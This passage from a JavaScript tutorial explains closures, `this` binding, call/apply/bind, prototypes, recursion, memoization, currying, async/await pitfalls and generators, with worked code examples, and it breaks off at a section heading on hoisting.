Normally, when a function finishes executing, its local execution context is destroyed and its variables are freed from memory.
However, `increment` retains a live reference to the Lexical Environment of `createCounter`. Because `counter1` holds a live reference to `increment`, the JavaScript Garbage Collector detects an active reference path and preserves the lexical binding of `count` in memory!

### 2. 7 Production Use Cases for Closures
1. **Data Privacy & Encapsulation**: Hiding state from external tampering (before private class fields existed).
2. **Function Factories**: Dynamically creating pre-configured functions.
3. **Memoization & Caching**: Maintaining a private lookup table across calls.
4. **Currying & Partial Application**: Capturing arguments across successive function invocations.
5. **Event Handlers**: Attaching metadata to DOM or socket listeners.
6. **Asynchronous Callbacks**: Preserving snapshot values when an async response resolves.
7. **The Classical Module Pattern**: Exposing public APIs while keeping internal state secure.

---

## 20. Closure Loop Problems (`var` vs `let`)

One of the most famous JavaScript interview questions:

```javascript
// ❌ THE CLASSIC 'var' LOOP BUG:
for (var i = 0; i < 3; i++) {
  setTimeout(() => {
    console.log("var index:", i);
  }, 100);
}
// Output after 100ms:
// var index: 3
// var index: 3
// var index: 3
```

### Why does this happen?
1. `var` is **function-scoped**, not block-scoped. There is only **one single shared `i` variable** across all loop iterations.
2. The loop runs synchronously to completion, incrementing the shared `i` from `0` to `3`.
3. Only after the loop finishes do the three `setTimeout` callbacks execute. They all look up the single shared `i` in the outer scope, which is now `3`.

### Solution 1: Modern ES6 `let` (Block Scope Binding)
```javascript
for (let i = 0; i < 3; i++) {
  setTimeout(() => {
    console.log("let index:", i);
  }, 100);
}
// Output: 0, 1, 2
```
> 💡 **The Specification Rule**: In ECMAScript, a `for` loop header with `let` creates a **brand new lexical binding (a fresh `i` variable in a new environment record) for every single iteration**! Each arrow function closes over its own separate `i`.

### Solution 2: Historical IIFE Closure Fix (Pre-ES6)
```javascript
for (var i = 0; i < 3; i++) {
  (function(capturedIndex) {
    setTimeout(() => {
      console.log("IIFE index:", capturedIndex);
    }, 100);
  })(i);
}
// Output: 0, 1, 2
```

---

## 21. Immediately Invoked Function Expressions (IIFE)

An **IIFE** (pronounced "iffy") is a JavaScript function that runs as soon as it is defined:

```javascript
// Standard Anonymous IIFE:
(function() {
  const privateSecret = "4901-abcd";
  console.log("IIFE executed immediately!");
})();

// Arrow Syntax IIFE:
(() => {
  console.log("Arrow IIFE executed!");
})();
```

### Why IIFEs Were Historically Critical
Before ES Modules (ES6 in 2015), any variable declared at the top of a `<script>` tag leaked directly into the global `window` namespace. If two libraries declared `var config = {}`, they collided and crashed the app. IIFEs created a private sandbox for library code.

### The Modern Role of IIFEs
With modern ES Modules (`import` / `export`), each file has its own isolated module scope by default, making top-level IIFEs largely obsolete. However, IIFEs are still useful today for:
1. **Top-level `await` fallbacks** in older Node/browser runtimes: `(async () => { await init(); })();`
2. **Local expression isolation** inside complex object definitions.

---

## 22. The `this` Keyword & The 4 Binding Rules

In ordinary (non-arrow) functions, `this` is **NOT determined by where the function is declared**.
Instead, `this` is determined **dynamically at runtime based strictly on how the function is invoked (the call-site)**!

There are 4 binding rules that govern `this`, ranked by strict precedence:

```text
Precedence (Highest to Lowest):
1. 'new' Binding          ───> new Constructor()
2. Explicit Binding       ───> fn.call(obj), fn.apply(obj), fn.bind(obj)
3. Implicit Binding       ───> obj.method()
4. Default Binding        ───> fn() (window in non-strict, undefined in strict)
```

### Rule 1: Default Binding (Standalone Function Call)
When a function is called standalone without any context object:
* In **Strict Mode** (`"use strict"`): `this` is `undefined`.
* In **Non-Strict Mode**: `this` falls back to the Global Object (`window` in browsers, `global` in Node.js).

```javascript
function showThis() {
  "use strict";
  console.log(this);
}

showThis(); // undefined (In strict mode)
```

### Rule 2: Implicit Binding (Object Context Call)
When a function is called with a preceding context object (`obj.method()`), `this` is bound to the **immediate object before the dot**:

```javascript
const database = {
  name: "PostgreSQL Production",
  connect() {
    return `Connecting to ${this.name}`;
  }
};

console.log(database.connect()); // "Connecting to PostgreSQL Production"
```

### Rule 3: Explicit Binding (`call`, `apply`, `bind`)
Explicitly specifying what `this` should point to:
```javascript
function describe(role, region) {
  return `${this.name} is a ${role} in ${region}`;
}

const engineer = { name: "Sarah" };

// .call: arguments passed as comma-separated list
console.log(describe.call(engineer, "Senior Dev", "US-East"));

// .apply: arguments passed as an array
console.log(describe.apply(engineer, ["Senior Dev", "US-East"]));
```

### Rule 4: `new` Binding (Constructor Invocation)
When a function is invoked with the `new` operator, `this` is automatically bound to the **brand new object** being created:

```javascript
function ServerInstance(ip) {
  this.ip = ip;
  this.status = "online";
}

const srv = new ServerInstance("192.168.1.10");
console.log(srv.ip); // "192.168.1.10"
```

---

## 23. Arrow Function `this` (Lexical `this`)

> 💡 **THE ARROW THIS INVARIANT**:
> Arrow functions do **NOT have their own `this` binding**. They do not participate in the 4 call-site binding rules.
> Instead, an arrow function resolves `this` **lexically** from its immediate enclosing scope (exactly like any regular variable!).

```javascript
const userProfile = {
  username: "ayush_dev",
  skills: ["JS", "Go", "Docker"],

  // 1. Regular method: gets implicit binding to userProfile
  showSkillsRegular() {
    // 2. Arrow function inside callback: captures 'this' lexically from showSkillsRegular!
    this.skills.forEach(skill => {
      console.log(`${this.username} knows ${skill}`);
    });
  },

  // ❌ COMMON MISTAKE: Defining object methods with arrows!
  showSkillsBroken: () => {
    // 'this' here is NOT userProfile! It is the outer global scope!
    console.log(this.username); // undefined!
  }
};

userProfile.showSkillsRegular(); // Works!
userProfile.showSkillsBroken();  // Broken!
```

---

## 24. `call`, `apply`, and `bind`

### 1. `fn.call(thisArg, arg1, arg2, ...)`
* Invokes `fn` **immediately**.
* Explicitly binds `this` to `thisArg`.
* Arguments passed sequentially.

### 2. `fn.apply(thisArg, [argsArray])`
* Invokes `fn` **immediately**.
* Explicitly binds `this` to `thisArg`.
* Arguments passed as an **Array** or array-like.

### 3. `fn.bind(thisArg, arg1, arg2, ...)`
* Does **NOT invoke** the function immediately!
* Returns a **brand new bound function** with `this` permanently locked to `thisArg`.
* Supports **Partial Application** (pre-filling initial arguments).

```javascript
function multiply(a, b) {
  return a * b;
}

// Pre-fill 'a' with 2:
const double = multiply.bind(null, 2);
console.log(double(10)); // 20 (2 * 10)
console.log(double(25)); // 50 (2 * 25)
```

---

## 25. Method Detachment & Losing `this`

One of the most frequent sources of runtime bugs in JavaScript and React is **Method Detachment**: taking a method off an object and passing it as a callback.

```javascript
class CloudStorage {
  constructor(bucket) {
    this.bucket = bucket;
  }

  upload() {
    console.log(`Uploading to ${this.bucket}...`);
  }
}

const storage = new CloudStorage("production-media");

// ✅ Direct invocation (Implicit binding):
storage.upload(); // "Uploading to production-media..."

// ❌ DETACHMENT BUG: Extracting the function reference:
const detachedUpload = storage.upload;
// detachedUpload(); // TypeError: Cannot read properties of undefined (reading 'bucket')

// ❌ DETACHMENT IN CALLBACK:
// setTimeout(storage.upload, 100); // Fails! 'this' inside setTimeout is the timer/window!
```

### Solutions to Method Detachment
```javascript
// Solution 1: Explicitly bind the method
setTimeout(storage.upload.bind(storage), 100);

// Solution 2: Wrap in an arrow function
setTimeout(() => storage.upload(), 100);

// Solution 3: Bind in class constructor (Common in older React)
// this.upload = this.upload.bind(this);
```


---

## 26. Built-in Function Properties

Because functions in JavaScript are exotic objects, they carry standard built-in properties:

### 1. `fn.name`
The name of the function as declared or inferred by the engine:
```javascript
function calculateScore() {}
console.log(calculateScore.name); // "calculateScore"

// Inferred names on expressions:
const handler = function() {};
console.log(handler.name); // "handler"
```

### 2. `fn.length` (Function Arity)
Returns the number of **formal declared parameters** before the first default parameter.
* ⚠️ Rest parameters (`...args`) are **NOT counted**.
* ⚠️ Default parameters and all subsequent parameters are **NOT counted**.

```javascript
function f1(a, b, c) {}
console.log(f1.length); // 3

function f2(a, b = 10, c) {}
console.log(f2.length); // 1 (Stops at first default parameter!)

function f3(...rest) {}
console.log(f3.length); // 0
```

> 💡 **Senior Design Note**: Relying on `fn.length` for critical business logic is fragile. While frameworks like Express historically inspected `fn.length === 4` to detect error middleware `(err, req, res, next)`, modern APIs prefer explicit registration or options objects.

---

## 27. Functions are Callable Objects

In JavaScript, a function is simply an Object with a special internal `[[Call]]` slot that allows it to be invoked. Because it is an object, **you can attach arbitrary properties and methods to it!**

```javascript
function apiEndpoint(request) {
  apiEndpoint.requestCount++;
  return `Response for ${request.url}`;
}

// Attaching properties directly to the function object:
apiEndpoint.requestCount = 0;
apiEndpoint.version = "v2.1";
apiEndpoint.resetMetrics = function() {
  this.requestCount = 0;
};

apiEndpoint({ url: "/users" });
apiEndpoint({ url: "/billing" });
console.log(apiEndpoint.requestCount); // 2
```

---

## 28. Constructor Functions & The `new` Operator

Prior to ES6 classes, constructor functions were the primary mechanism for object-oriented instantiation in JavaScript.

```javascript
function DatabaseConnection(host, port) {
  this.host = host;
  this.port = port;
  this.connected = false;
}

const db = new DatabaseConnection("localhost", 5432);
console.log(db.host); // "localhost"
```

### The 5 Conceptual Steps of the `new` Operator
When you invoke a function with `new Constructor(...args)`, the engine executes the following algorithm:
1. **Creates a brand new empty plain JavaScript object** in memory: `{}`.
2. **Links the prototype**: Sets the new object's internal `[[Prototype]]` to `Constructor.prototype`.
3. **Binds `this`**: Sets the execution context's `this` keyword to reference the newly created object.
4. **Executes the constructor body**: Adds properties and runs initialization code.
5. **Returns the object**:
   * If the function does not return an explicit object, the newly created object from Step 1 is returned.
   * If the function explicitly returns a **primitive** (number, string), the primitive is **ignored** and the newly created object is returned.
   * If the function explicitly returns an **object**, that returned object **overrides** the new instance!

```javascript
function TestReturnObject() {
  this.name = "Original";
  return { name: "Overridden" }; // Overrides 'this'!
}
console.log(new TestReturnObject().name); // "Overridden"

function TestReturnPrimitive() {
  this.name = "Original";
  return 42; // Primitives are completely ignored!
}
console.log(new TestReturnPrimitive().name); // "Original"
```

---

## 29. Prototypes & The `prototype` Property

> ⚠️ **CRITICAL DISTINCTION**:
> * `Constructor.prototype`: A regular property on a function object that serves as the blueprint prototype for objects created with `new Constructor()`.
> * `Object.getPrototypeOf(instance)` (or `__proto__`): The actual internal prototype pointer on an instantiated object linking it up the prototype chain.

```text
┌───────────────────────────┐
│ DatabaseConnection        │
│   .prototype ─────────────┼───────────────┐
└───────────────────────────┘               ▼
                                ┌───────────────────────────┐
                                │ DatabaseConnection.       │
                                │ prototype Object          │
                                │   - connect()             │
                                └───────────────────────────┘
                                            ▲
                                            │ [[Prototype]]
                                ┌───────────┴───────────────┐
                                │ db instance               │
                                │   - host: "localhost"     │
                                └───────────────────────────┘
```

```javascript
function Task(title) {
  this.title = title;
}

// Adding method to prototype:
Task.prototype.complete = function() {
  this.completed = true;
};

const t1 = new Task("Deploy API");
t1.complete();
console.log(t1.completed); // true
console.log(Object.getPrototypeOf(t1) === Task.prototype); // true
```

---

## 30. Prototype Methods vs Constructor In-Body Methods

Why should methods be placed on the prototype instead of inside the constructor?

```javascript
// ❌ IN-BODY METHODS (Anti-pattern for high-volume instances):
function UserBad(name) {
  this.name = name;
  this.save = function() { console.log("Saving..."); };
}
// If you create 100,000 UserBad instances, you allocate 100,000 SEPARATE function
// objects in memory—wasting massive heap space!

// ✅ PROTOTYPE METHODS (Memory-efficient):
function UserGood(name) {
  this.name = name;
}
UserGood.prototype.save = function() { console.log("Saving..."); };
// Only ONE 'save' function exists in memory! All 100,000 instances share it!
```

---

## 31. Class Methods & Modern Object Orientation

ES6 Classes are largely syntactic sugar over JavaScript's existing prototype-based inheritance and constructor functions.

```javascript
class PaymentProcessor {
  #secretKey; // Private instance field (ES2022)

  constructor(apiKey) {
    this.#secretKey = apiKey;
    this.totalProcessed = 0;
  }

  // 1. Instance Method (Placed on PaymentProcessor.prototype):
  process(amount) {
    this.totalProcessed += amount;
    return `Processed $${amount}`;
  }

  // 2. Getter & Setter:
  get keyPreview() {
    return this.#secretKey.slice(0, 4) + "****";
  }

  // 3. Static Method (Placed on PaymentProcessor constructor, not instances):
  static isSupportedCurrency(currency) {
    return ["USD", "EUR", "GBP"].includes(currency);
  }
}

const processor = new PaymentProcessor("sk_live_998877");
console.log(processor.process(500)); // "Processed $500"
console.log(processor.keyPreview);   // "sk_l****"
console.log(PaymentProcessor.isSupportedCurrency("USD")); // true
```


---

## 32. Recursion Fundamentals

A **recursive function** is a function that calls itself until it reaches a termination condition known as the **base case**.

```text
Call Stack Growth (Winding Phase):
countdown(3)
  └── countdown(2)
        └── countdown(1)
              └── countdown(0) ──> Base Case Reached!

Stack Unwinding Phase:
countdown(0) returns
countdown(1) returns
countdown(2) returns
countdown(3) returns
```

### 1. The Anatomy of Every Recursive Function
Every recursive function MUST have two parts:
1. **Base Case**: The stopping condition that returns a value without making another recursive call.
2. **Recursive Step**: Calling itself with an argument that progresses closer to the base case.

```javascript
function countdown(n) {
  // 1. Base Case:
  if (n <= 0) {
    console.log("Blast off!");
    return;
  }

  // 2. Recursive Step:
  console.log(n);
  countdown(n - 1);
}

countdown(3);
```

### 2. The Stack Overflow Phenomenon
If you omit the base case or pass arguments that never reach the base case, the function calls itself infinitely until the engine exhausts its allocated Call Stack memory, throwing:
`RangeError: Maximum call stack size exceeded`.

---

## 33. 12 Essential Recursion Algorithms

---

#### 1. Factorial ($N!$)
```javascript
function factorial(n) {
  if (n <= 1) return 1;
  return n * factorial(n - 1);
}
// factorial(5) -> 120 | Time: O(n) | Space: O(n) stack
```

#### 2. Fibonacci Number ($F_n$)
```javascript
function fibonacci(n) {
  if (n <= 0) return 0;
  if (n === 1) return 1;
  return fibonacci(n - 1) + fibonacci(n - 2);
}
// fibonacci(6) -> 8 | Time: O(2^n) unmemoized | Space: O(n) stack
```

#### 3. Power Function ($x^n$ in $O(\log n)$)
```javascript
function fastPower(x, n) {
  if (n === 0) return 1;
  if (n < 0) return 1 / fastPower(x, -n);
  const half = fastPower(x, Math.floor(n / 2));
  return n % 2 === 0 ? half * half : half * half * x;
}
// fastPower(2, 10) -> 1024 | Time: O(log n) | Space: O(log n)
```

#### 4. Recursive Array Sum
```javascript
function sumArrayRecursive(arr, idx = 0) {
  if (idx >= arr.length) return 0;
  return arr[idx] + sumArrayRecursive(arr, idx + 1);
}
// sumArrayRecursive([1, 2, 3, 4]) -> 10 | Time: O(n) | Space: O(n)
```

#### 5. Reverse String Recursively
```javascript
function reverseStringRecursive(str) {
  if (str.length <= 1) return str;
  return reverseStringRecursive(str.slice(1)) + str[0];
}
// reverseStringRecursive("hello") -> "olleh" | Time: O(n^2) due to slice | Space: O(n)
```

#### 6. Palindrome Check
```javascript
function isPalindromeRecursive(str) {
  if (str.length <= 1) return true;
  if (str[0] !== str[str.length - 1]) return false;
  return isPalindromeRecursive(str.slice(1, -1));
}
// isPalindromeRecursive("racecar") -> true | Time: O(n) | Space: O(n)
```

#### 7. Binary Tree Traversal (In-Order)
```javascript
function inOrderTraversal(node, result = []) {
  if (!node) return result;
  inOrderTraversal(node.left, result);
  result.push(node.val);
  inOrderTraversal(node.right, result);
  return result;
}
// Time: O(n) | Space: O(h) where h is tree height
```

#### 8. Deep Nested Object Value Search
```javascript
function findNestedKey(obj, targetKey) {
  if (obj === null || typeof obj !== "object") return undefined;
  if (targetKey in obj) return obj[targetKey];

  for (const key of Object.keys(obj)) {
    const found = findNestedKey(obj[key], targetKey);
    if (found !== undefined) return found;
  }
  return undefined;
}
// Time: O(n) nodes | Space: O(d) depth
```

#### 9. Recursive Directory Traversal
```javascript
function listFilesRecursive(node) {
  const files = [];
  if (node.type === "file") return [node.name];
  if (node.children) {
    for (const child of node.children) {
      files.push(...listFilesRecursive(child));
    }
  }
  return files;
}
```

#### 10. Generate Subsets (Power Set)
```javascript
function generateSubsets(nums) {
  const result = [];
  function backtrack(index, current) {
    result.push([...current]);
    for (let i = index; i < nums.length; i++) {
      current.push(nums[i]);
      backtrack(i + 1, current);
      current.pop();
    }
  }
  backtrack(0, []);
  return result;
}
// generateSubsets([1, 2]) -> [[], [1], [1, 2], [2]] | Time: O(2^n) | Space: O(n)
```

#### 11. Generate Permutations
```javascript
function permute(nums) {
  const result = [];
  function backtrack(current, remaining) {
    if (remaining.length === 0) {
      result.push(current);
      return;
    }
    for (let i = 0; i < remaining.length; i++) {
      backtrack(
        [...current, remaining[i]],
        [...remaining.slice(0, i), ...remaining.slice(i + 1)]
      );
    }
  }
  backtrack([], nums);
  return result;
}
// permute([1, 2, 3]) -> 6 permutations | Time: O(n!) | Space: O(n)
```

#### 12. Combinations of Size K
```javascript
function combine(n, k) {
  const result = [];
  function backtrack(start, current) {
    if (current.length === k) {
      result.push([...current]);
      return;
    }
    for (let i = start; i <= n; i++) {
      current.push(i);
      backtrack(i + 1, current);
      current.pop();
    }
  }
  backtrack(1, []);
  return result;
}
// combine(4, 2) -> [[1,2], [1,3], [1,4], [2,3], [2,4], [3,4]] | Time: O(C(n, k))
```

---

## 34. Memoization (Caching Pure Functions)

**Memoization** is an optimization technique that caches the return values of a pure function based on its input arguments, avoiding redundant re-computations.

```javascript
function memoize(fn) {
  const cache = new Map();

  return function(...args) {
    // 💡 Primitive or single argument key strategy:
    const key = args.length === 1 && typeof args[0] !== "object" ? args[0] : JSON.stringify(args);

    if (cache.has(key)) {
      return cache.get(key); // Instant O(1) cache hit!
    }

    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

const memoizedFib = memoize(function fib(n) {
  if (n <= 1) return n;
  return memoizedFib(n - 1) + memoizedFib(n - 2);
});

console.log(memoizedFib(50)); // Fast O(n) instead of freezing for years!
```

> ⚠️ **Why `JSON.stringify` is NOT a Universally Correct Cache Key**:
> 1. **Object Key Ordering**: `{ a: 1, b: 2 }` serializes to `'{"a":1,"b":2}'`, but `{ b: 2, a: 1 }` serializes to `'{"b":2,"a":1}'`. Logically identical objects produce cache misses!
> 2. **Loss of Types**: Functions and `undefined` are dropped; `NaN` becomes `null`.
> 3. **Circular Structures**: Throws a fatal `TypeError`.
> 4. **Performance Overhead**: Serializing a 10 MB payload takes more CPU time than the function computation itself!
> *Solution*: For complex objects, use a `WeakMap` or dedicated multi-key trie lookup.

---

## 35. Currying

**Currying** is a mathematical technique of transforming a function with multiple arguments $f(a, b, c)$ into a sequence of nested functions each taking a single argument: $f(a)(b)(c)$.

```javascript
// Normal function:
const addNormal = (a, b, c) => a + b + c;
console.log(addNormal(1, 2, 3)); // 6

// Curried manually:
const addCurried = a => b => c => a + b + c;
console.log(addCurried(1)(2)(3)); // 6
```

### General-Purpose Auto-Currying Function
```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...nextArgs) {
      return curried.apply(this, [...args, ...nextArgs]);
    };
  };
}

const sum3 = (a, b, c) => a + b + c;
const curriedSum = curry(sum3);

console.log(curriedSum(1, 2, 3));    // 6
console.log(curriedSum(1)(2, 3));    // 6
console.log(curriedSum(1)(2)(3));    // 6
```

---

## 36. Partial Application

**Partial Application** fixes a number of arguments to a function, producing another function of smaller arity.

### Currying vs Partial Application
* **Currying**: Always produces a chain of unary (single-argument) functions until all parameters are satisfied: $f(a)(b)(c)$.
* **Partial Application**: Binds some arguments upfront and returns a function that takes **all remaining arguments at once**: $f(a, b)(c, d)$.

```javascript
function partial(fn, ...presetArgs) {
  return function(...laterArgs) {
    return fn.apply(this, [...presetArgs, ...laterArgs]);
  };
}

const sendEmail = (apiKey, from, to, subject) => {
  return `Sent "${subject}" to ${to} from ${from} via key ${apiKey.slice(0, 4)}****`;
};

// Partially apply API key and sender email:
const sendFromNoReply = partial(sendEmail, "sk_live_123456", "noreply@antigravity.io");

console.log(sendFromNoReply("ayush@google.com", "Welcome to Antigravity!"));
```

---

## 37. Function Decorators & Wrappers

A **Decorator** is a higher-order function that wraps an existing function, intercepts its call, and extends its behavior while preserving its original contract and `this` binding.

```javascript
function withValidation(fn, validator) {
  return function(...args) {
    const error = validator(...args);
    if (error) throw new Error(`Validation Failed: ${error}`);
    return fn.apply(this, args);
  };
}

const divide = (a, b) => a / b;
const safeDivide = withValidation(divide, (a, b) => b === 0 ? "Division by zero" : null);

console.log(safeDivide(10, 2)); // 5
// safeDivide(10, 0); // Throws Error: Validation Failed: Division by zero
```

---

## 38. Function Composition & Pipelines

Function composition chains functions together where each function's output becomes the next function's input:

```javascript
// 1. Compose (Right-to-Left: standard mathematical notation f ∘ g)
const compose = (...fns) => x => fns.reduceRight((acc, fn) => fn(acc), x);

// 2. Pipe (Left-to-Right: Unix pipe style, highly intuitive for data flows)
const pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x);

const stripHtml = s => s.replace(/<[^>]*>?/gm, "");
const normalizeWhitespace = s => s.replace(/\s+/g, " ").trim();
const truncate = s => s.length > 20 ? s.slice(0, 20) + "..." : s;

const sanitizePostPreview = pipe(
  stripHtml,
  normalizeWhitespace,
  truncate
);

console.log(sanitizePostPreview("<p>Hello   world from  <b>DeepMind</b>!</p>"));
// "Hello world from Dee..."
```

---

## 39. Function Factories

A **Function Factory** is a function that returns a new customized function based on configuration parameters:

```javascript
function createLogger(prefix, environment = "development") {
  return {
    info: (msg) => console.log(`[${environment.toUpperCase()}] [${prefix}] INFO: ${msg}`),
    error: (msg) => console.error(`[${environment.toUpperCase()}] [${prefix}] ERROR: ${msg}`)
  };
}

const authLogger = createLogger("AuthService", "production");
authLogger.info("User signed in"); // "[PRODUCTION] [AuthService] INFO: User signed in"
```

---

## 40. Callbacks & Event-Driven Programming

In JavaScript's single-threaded event loop, long-running operations cannot block the Call Stack. Callbacks provide the historical mechanism for executing code once an event finishes:

```javascript
// Node.js Error-First Callback Pattern: (err, result) => void
function readFileSimulated(filename, callback) {
  setTimeout(() => {
    if (!filename) {
      callback(new Error("Filename required"), null);
      return;
    }
    callback(null, `Contents of ${filename}`);
  }, 100);
}

readFileSimulated("config.json", (err, data) => {
  if (err) {
    console.error("Read failed:", err.message);
    return;
  }
  console.log("File loaded:", data);
});
```

### The Problem of "Callback Hell"
Nesting multiple dependent callbacks creates inverted pyramids that are impossible to maintain, error-bubble, or refactor. This led directly to the creation of **Promises** and **Async Functions**.


---

## 41. Asynchronous Functions (`async` / `await`)

Introduced in ES2017 (ES8), `async` and `await` provide clean, synchronous-looking syntax for working with Promises.

### 1. The Core Invariant of `async` Functions
> 💡 **INVARIANT**: Any function declared with the `async` keyword **ALWAYS returns a Promise**.
> If you return a non-Promise value (e.g. `return 42;`), the JavaScript engine automatically wraps it in a resolved promise: `Promise.resolve(42)`.
> If you throw an error inside an async function, it returns a rejected promise: `Promise.reject(error)`.

```javascript
async function fetchStatus() {
  return "SYSTEM_ONLINE"; // Engine wraps in Promise.resolve("SYSTEM_ONLINE")
}

const result = fetchStatus();
console.log(result); // Promise { 'SYSTEM_ONLINE' } (NOT the string directly!)
result.then(val => console.log("Unwrapped:", val));
```

### 2. The `await` Operator
The `await` keyword pauses the execution of the async function until the Promise settles (resolves or rejects).
* It extracts the resolved value directly.
* ⚠️ It does **NOT block the main thread or Call Stack**! The JavaScript engine suspends the function's execution context and frees the Call Stack to process other microtasks and UI events.

```javascript
async function loadUserData(userId) {
  try {
    const response = await fetch(`https://api.example.com/users/${userId}`);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Failed to load user:", error.message);
    throw error; // Re-throw to caller or return fallback
  } finally {
    console.log("Cleanup actions executed");
  }
}
```

---

## 42. Async Arrow Functions

Async arrow functions combine the lexical `this` of arrow functions with asynchronous promise mechanics:

```javascript
const fetchMetrics = async (serverIp) => {
  const res = await fetch(`http://${serverIp}/metrics`);
  return res.json();
};
```

---

## 43. Promises + Functions

A Promise represents the eventual completion (or failure) of an asynchronous operation.

```text
                 ┌───> Fulfilled (.then())
Pending Promise ─┤
                 └───> Rejected  (.catch())
                                    │
                                    └───> Finally (.finally())
```

```javascript
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Chaining pattern:
delay(500)
  .then(() => "Step 1 complete")
  .then(step1 => {
    console.log(step1);
    return "Step 2 complete";
  })
  .catch(err => console.error("Pipeline failed:", err))
  .finally(() => console.log("All steps done"));
```

---

## 44. The Two Most Fatal Async Callback Mistakes

---

### Mistake 1: The `arr.map(async ...)` Trap
Calling an async function inside `Array.prototype.map` returns an **Array of pending Promises**, NOT an array of resolved values!

```javascript
const ids = [1, 2, 3];
const fetchUser = async id => ({ id, name: `User-${id}` });

// ❌ BROKEN:
const brokenUsers = ids.map(async id => await fetchUser(id));
console.log(brokenUsers); 
// [ Promise { <pending> }, Promise { <pending> }, Promise { <pending> } ]

// ✅ SOLUTION: Await Promise.all!
const validUsers = await Promise.all(ids.map(id => fetchUser(id)));
console.log(validUsers); 
// [ { id: 1, name: 'User-1' }, { id: 2, name: 'User-2' }, ... ]
```

---

### Mistake 2: The `forEach(async ...)` Fire-and-Forget Trap
`Array.prototype.forEach` does **NOT pause or await promises**!

```javascript
// ❌ BROKEN: forEach ignores returned promises!
async function saveAllBroken(items) {
  items.forEach(async item => {
    await databaseSave(item); // Fires in background!
  });
  console.log("Done!"); // ⚠️ Logs IMMEDIATELY before items are saved!
}

// ✅ SOLUTION: Sequential processing with for...of:
async function saveAllSequential(items) {
  for (const item of items) {
    await databaseSave(item); // Waits for each item to save
  }
  console.log("Done safely!");
}
```

---

## 45. Asynchronous Concurrency Patterns

---

### 1. Sequential vs Parallel Execution
```javascript
const taskA = async () => 10;
const taskB = async () => 20;

// Sequential (Takes TimeA + TimeB):
const resA = await taskA();
const resB = await taskB();

// Parallel (Takes Max(TimeA, TimeB)):
const [pA, pB] = await Promise.all([taskA(), taskB()]);
```

### 2. The 4 Modern Promise Combinators
* **`Promise.all([p1, p2])`**: Fails fast if ANY promise rejects.
* **`Promise.allSettled([p1, p2])`**: Never rejects. Returns status and value/reason for all.
* **`Promise.race([p1, p2])`**: Returns outcome of the **first** promise to settle (fulfill or reject).
* **`Promise.any([p1, p2])`**: Returns outcome of the **first promise to FULFILL** (ignores rejections unless all reject).

---

## 46. Generator Functions (`function*`)

A **Generator Function** is a function that can be paused mid-execution and resumed later, yielding multiple values on demand.

```javascript
function* numberGenerator() {
  console.log("Start");
  yield 1;
  console.log("Resumed at 2");
  yield 2;
  console.log("Finished");
  return 3;
}

const gen = numberGenerator(); // Does NOT execute body yet!
console.log(gen.next()); // Logs "Start", returns { value: 1, done: false }
console.log(gen.next()); // Logs "Resumed at 2", returns { value: 2, done: false }
console.log(gen.next()); // Logs "Finished", returns { value: 3, done: true }
```

### Invariants of Generators
1. Declared with an asterisk: `function*`.
2. Uses the `yield` keyword to pause execution and produce a value.
3. Produces a Generator object complying with the Iteration Protocol.
4. Calling `.next(arg)` resumes execution, optionally injecting `arg` back into the function at the paused `yield` location!

---

## 47. Generators & Iterables

Because Generators implement the Iterable Protocol (`[Symbol.iterator]`), they can be consumed directly by `for...of` loops and the spread operator `...`:

```javascript
function* infiniteIdGenerator() {
  let id = 1;
  while (true) {
    yield id++;
  }
}

const ids = infiniteIdGenerator();
console.log(ids.next().value); // 1
console.log(ids.next().value); // 2

// Creating custom iterable ranges:
function* range(start, end) {
  for (let i = start; i <= end; i++) yield i;
}

for (const num of range(1, 4)) {
  console.log("Range item:", num); // 1, 2, 3, 4
}
console.log([...range(10, 13)]); // [10, 11, 12, 13]
```

---

## 48. Asynchronous Generators (`async function*`)

An **Async Generator** combines generators with asynchronous promises. It produces an **Async Iterable** consumed via `for await...of`:

```javascript
async function* fetchPaginatedAuditLogs(pageSize = 2) {
  let page = 1;
  let hasMore = true;

  while (hasMore) {
    // Simulate fetching page from REST API:
    const data = await simulateApiFetch(page, pageSize);
    yield data.items;

    hasMore = page < data.totalPages;
    page++;
  }
}

async function simulateApiFetch(page, size) {
  return {
    page,
    totalPages: 3,
    items: [`Log-${page}-A`, `Log-${page}-B`]
  };
}

// Consuming with for await...of:
async function consumeLogs() {
  for await (const batch of fetchPaginatedAuditLogs(2)) {
    console.log("Received batch:", batch);
  }
}

consumeLogs();
```


---

## 49. The Function Execution Model

To understand advanced JavaScript, you must understand what happens inside the JavaScript engine when a function executes.

```text
Global Execution Context (GEC) Created
   ↓
Engine compiles code & allocates Lexical Environments
   ↓
Function Called -> Pushes Function Execution Context (FEC) to Call Stack
   ├── Environment Record (Stores local vars, params, 'arguments')
   ├── Outer Lexical Environment Reference (Scope Chain)
   └── ThisBinding
   ↓
Code Executes Line-by-Line
   ↓
Function Returns -> FEC Popped off Call Stack
```

### 1. The Global Execution Context (GEC)
Created when the JavaScript engine starts up. It creates the global object (`window` or `global`) and binds `this` to it.

### 2. The Function Execution Context (FEC)
Created every time a function is **invoked** (not defined). Each call receives its own separate execution context with:
* **Environment Record**: Holds local variables, declared functions, and parameter bindings.
* **Outer Environment Reference**: The pointer to the parent lexical environment where the function was physically defined (enabling the Scope Chain and Closures).
* **ThisBinding**: Determined by the 4 call-site rules or lexical inheritance.

---

## 50. The Call Stack

The **Call Stack** is a LIFO (Last-In, First-Out) data structure used by the JavaScript engine to keep track of the point to which each active function should return when it finishes executing.

```text
function a() { b(); }
function b() { c(); }
function c() { console.log("Stack Top"); }
a();

Call Stack Progression:
┌──────────┐      ┌──────────┐      ┌──────────┐      ┌──────────┐
│          │      │          │      │   c()    │      │          │
├──────────┤      ├──────────┤      ├──────────┤      ├──────────┤
│          │      │   b()    │      │   b()    │      │   b()    │
├──────────┤      ├──────────┤      ├──────────┤      ├──────────┤
│   a()    │ ───> │   a()    │ ───> │   a()    │ ───> │   a()    │ ───> Global
├──────────┤      ├──────────┤      ├──────────┤      ├──────────┤
│  Global  │      │  Global  │      │  Global  │      │  Global  │
└──────────┘      └──────────┘      └──────────┘      └──────────┘
```

---

## 51. Hoisting Deep Dive

Hoisting describes how the JavaScript engine allocates memory for identifiers during the Creation Phase prior to the Execution Phase.

### Comparison of Hoisting Behavior
